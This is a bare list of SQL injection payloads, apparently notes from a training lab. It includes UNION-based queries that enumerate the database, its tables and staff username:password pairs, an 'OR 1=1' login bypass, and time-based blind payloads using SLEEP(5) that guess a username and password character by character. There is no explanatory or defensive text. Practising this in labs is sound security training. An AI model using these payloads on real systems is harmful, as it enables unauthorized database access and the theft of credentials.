1 UNION SELECT 1

0 UNION SELECT 1,2,database()

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

0 UNION SELECT 1,2,group_concat(username,':',password) FROM staff_users

admin
'OR 1=1;--

admin123' UNION SELECT SLEEP(5),2;--

admin123' UNION SELECT SLEEP(5),2 from users where username like 'a%';

admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin';

admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin' and password like 'p%';

admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin' and password like '4961';
